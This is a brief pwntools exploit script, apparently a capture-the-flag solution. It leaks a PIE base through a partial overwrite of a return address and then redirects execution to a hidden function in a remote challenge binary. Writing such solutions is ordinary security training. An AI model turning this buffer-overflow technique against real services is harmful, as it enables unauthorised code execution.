from pwn import *

context.binary = exe = ELF('chall')

io = remote('hidden.ctf.intigriti.io', 1337)
payload = b'i'*71 + b'a' + b'\x59'
io.sendafter(b':\n', payload)
io.recvuntil(b'ia')
exe.address = u64(io.recvline(keepends=False).ljust(8, b'\0')) - (exe.sym['main']+63)
log.info(f'ELF base: {hex(exe.address)}')
payload = b'i'*72 + p64(exe.sym['_'])
io.sendafter(b':\n', payload)
io.interactive()